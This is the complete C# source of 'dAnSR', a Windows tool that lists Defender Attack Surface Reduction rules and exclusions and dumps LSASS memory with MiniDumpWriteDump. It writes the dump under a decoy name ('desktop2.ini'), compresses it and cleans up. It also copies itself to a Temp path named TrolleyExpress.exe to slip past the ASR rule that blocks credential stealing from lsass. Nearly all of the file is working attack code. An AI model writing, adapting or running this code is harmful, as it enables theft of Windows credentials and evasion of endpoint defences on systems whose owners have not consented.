using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.ComponentModel;
using System.IO.Compression;

namespace dAnSR
{
    internal enum ASRAction
    {
        Disabled = 0,
        Enabled = 1,
        Audit = 2,
        Warn = 6
    }

    internal struct ASRRule
    {
        // Case-insensitive mapping for GUIDs (updated to include all current ASR rules)
        private static readonly Dictionary<string, string> NameDict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            { "56a863a9-875e-4185-98a7-b882c64b5ce5", "Block abuse of exploited vulnerable signed drivers" },
            { "7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c", "Block Adobe Reader from creating child processes" },
            { "d4f940ab-401b-4efc-aadc-ad5f3c50688a", "Block all Office applications from creating child processes" },
            { "9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2", "Block credential stealing from the Windows local security authority subsystem (lsass.exe)" },
            { "be9ba2d9-53ea-4cdc-84e5-9b1eeee46550", "Block executable content from email client and webmail" },
            { "01443614-cd74-433a-b99e-2ecdc07bfc25", "Block executable files from running unless they meet a prevalence, age, or trusted list criterion" },
            { "5beb7efe-fd9a-4556-801d-275e5ffc04cc", "Block execution of potentially obfuscated scripts" },
            { "d3e037e1-3eb8-44c8-a917-57927947596d", "Block JavaScript or VBScript from launching downloaded executable content" },
            { "3b576869-a4ec-4529-8536-b80a7769e899", "Block Office applications from creating executable content" },
            { "75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84", "Block Office applications from injecting code into other processes" },
            { "26190899-1602-49e8-8b27-eb1d0a1ce869", "Block Office communication application from creating child processes" },
            { "e6db77e5-3df2-4cf1-b95a-636979351e5b", "Block persistence through WMI event subscription" },
            { "d1e49aac-8f56-4280-b9ba-993a6d77406c", "Block process creations originating from PSExec and WMI commands" },
            { "33ddedf1-c6e0-47cb-833e-de6133960387", "Block rebooting machine in Safe Mode" },
            { "b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4", "Block untrusted and unsigned processes that run from USB" },
            { "c0033c00-d16d-4114-a5a0-dc9b3a7d2ceb", "Block use of copied or impersonated system tools" },
            { "a8f5898e-1dc8-49a9-9878-85004b8a61e6", "Block Webshell creation for Servers" },
            { "92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b", "Block Win32 API calls from Office macros" },
            { "c1db55ab-c21a-4637-bb3f-a12568109d35", "Use advanced protection against ransomware" }
        };

        public string Id;
        public ASRAction Action;

        public override string ToString()
        {
            if (NameDict.TryGetValue(Id, out var name))
            {
                return $"[{Id}] {name}: {Action}";
            }
            else
            {
                return $"[{Id}] <Unknown Rule>: {Action}";
            }
        }
    }

    internal class Program
    {
        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        private static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

        private static bool IsCurrentDirectoryWritable()
        {
            try
            {
                string tempFilePath = Path.Combine(Environment.CurrentDirectory, Guid.NewGuid().ToString("N") + ".tmp");
                using (File.Create(tempFilePath)) { }
                File.Delete(tempFilePath);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        private static bool IsRunningAsAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static void CompressFile(FileStream sourceStream, string gzipPath)
        {
            using (FileStream fs = new FileStream(gzipPath, FileMode.Create))
            {
                using (GZipStream zipStream = new GZipStream(fs, CompressionMode.Compress, false))
                {
                    sourceStream.CopyTo(zipStream);
                }
            }
        }

        private static (List<ASRRule>, string[]) QueryASRInformation()
        {
            ManagementScope scope = new ManagementScope(@"\\.\root\Microsoft\Windows\Defender");
            ObjectQuery query = new ObjectQuery("SELECT * FROM MSFT_MpPreference");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
            ManagementObject result = searcher.Get().OfType<ManagementObject>().First();

            List<ASRRule> asrRules = new List<ASRRule>();
            string[] asrIds, asrExclusions = new string[0];
            byte[] asrActions;

            asrIds = (string[])result["AttackSurfaceReductionRules_Ids"];

            if (asrIds == null)
            {
                return (asrRules, asrExclusions);
            }

            asrActions = (byte[])result["AttackSurfaceReductionRules_Actions"];
            asrExclusions = (string[])result["AttackSurfaceReductionOnlyExclusions"];

            for (int i = 0; i < asrIds.Length; i++)
            {
                ASRRule rule;
                rule.Id = asrIds[i];
                rule.Action = (ASRAction)asrActions[i];

                asrRules.Add(rule);
            }

            return (asrRules, asrExclusions);
        }

        private static void Enum()
        {
            (List<ASRRule> asrRules, string[] generalExclusions) = QueryASRInformation();

            if (asrRules.Count == 0)
            {
                Console.WriteLine("[+] No ASR rules configured");
                return;
            }

            Console.WriteLine("[+] Configured ASR rules: ");
            foreach (ASRRule asrRule in asrRules)
            {
                Console.WriteLine(asrRule);
            }

            Console.WriteLine();

            if (IsRunningAsAdmin())
            {
                if (generalExclusions != null)
                {
                    Console.WriteLine("[+] Paths generally excluded from ASR rules (does not affect LSASS): ");
                    foreach (string exclusion in generalExclusions)
                    {
                        Console.WriteLine(exclusion);
                    }
                } 
                else
                {
                    Console.WriteLine("[-] No exclusions are configured");
                }
            }
            else
            {
                Console.WriteLine("[-] Check requires local admin");
            }
        }

        private static void Dump()
        {
            if (!IsRunningAsAdmin())
            {
                Console.WriteLine("[-] Need to run with admin privs");
                return;
            }

            Process process = Process.GetProcessesByName("lsass")[0];
            uint processId = (uint)process.Id;
            IntPtr hProcess = process.Handle;

            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[-] Could not get a handle to lsass");
                return;
            }

            string dumpPath = Path.Combine(Environment.CurrentDirectory, "desktop2.ini");
            FileStream procdumpFileStream = File.Create(dumpPath);

            bool success = MiniDumpWriteDump(hProcess, processId, procdumpFileStream.SafeFileHandle, 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (!success)
            {
                Console.WriteLine($"[-] Failed to dump lsass: {new Win32Exception(Marshal.GetLastWin32Error()).Message}");
                procdumpFileStream.Dispose();
                File.Delete(dumpPath);
                return;
            }

            Console.WriteLine($"[+] Dumped lsass: {dumpPath}");

            string gzipPath = Environment.CurrentDirectory + @"\dansr.gz";
            CompressFile(procdumpFileStream, gzipPath);
            Console.WriteLine($"[+] Compressed dump: {gzipPath}");

            procdumpFileStream.Dispose();
            File.Delete(dumpPath);
            Console.WriteLine($"[+] Cleaned up dump file");
        }

        private static void Auto()
        {
            if (!IsRunningAsAdmin())
            {
                Console.WriteLine("[-] Need to run with admin privs");
                return;
            }

            Random random = new Random();
            string targetPath, tempDirectory = Path.GetTempPath();
            int randomNumber;

            do
            {
                randomNumber = random.Next();
                targetPath = $@"{tempDirectory}Ctx-{randomNumber}\Extract\";
            } while (File.Exists(targetPath));

            try
            {
                Directory.CreateDirectory(targetPath);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Failed to create {targetPath}: {ex.Message}");
                return;
            }
            Console.WriteLine($"[+] Created {targetPath}");

            string exePath = targetPath + "TrolleyExpress.exe";

            try
            {
                File.Copy(Assembly.GetExecutingAssembly().Location, exePath);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Failed to create {targetPath}: {ex.Message}");
                Directory.Delete(Directory.GetParent(targetPath).FullName, true);
                return;
            }
            Console.WriteLine($"[+] Copied dAnSR to {exePath}");

            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = exePath,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process process = new Process
                {
                    StartInfo = startInfo
                };

                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                Console.WriteLine(output);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] {ex.Message}");
            }

            Directory.Delete(Directory.GetParent(Directory.GetParent(targetPath).FullName).FullName, true);
        }

        static void Main(string[] args)
        {
            if (AppDomain.CurrentDomain.FriendlyName == "dAnSR.exe")
            {
                if (args.Length == 1 && args[0] == "enum")
                {
                    Enum();
                }
                else if (args.Length == 1 && args[0] == "dump")
                {
                    Dump();
                }
                else if (args.Length == 1 && args[0] == "auto")
                {
                    if (!IsCurrentDirectoryWritable())
                    {
                        Console.WriteLine("[-] Make sure CWD is writable");
                        return;
                    }
                    Auto();
                }
                else
                {
                    Console.WriteLine("Usage: dAnSR.exe [options]");
                    Console.WriteLine("Options:");
                    Console.WriteLine("  enum   - Enumerate configured ASR rules and exclusions");
                    Console.WriteLine("  dump   - Dump lsass via MiniDumpWriteDump");
                    Console.WriteLine($@"  auto   - Copy dAnSR to {Path.GetTempPath()}Ctx-*\Extract\TrolleyExpress.exe and dump lsass (ASR bypass)");
                    Console.WriteLine("");
                    Console.WriteLine("Note: Rename this binary to automatically dump lsass upon execution (no arg mode)");
                }
            }
            else
            {
                Dump();
            }
        }
    }
}
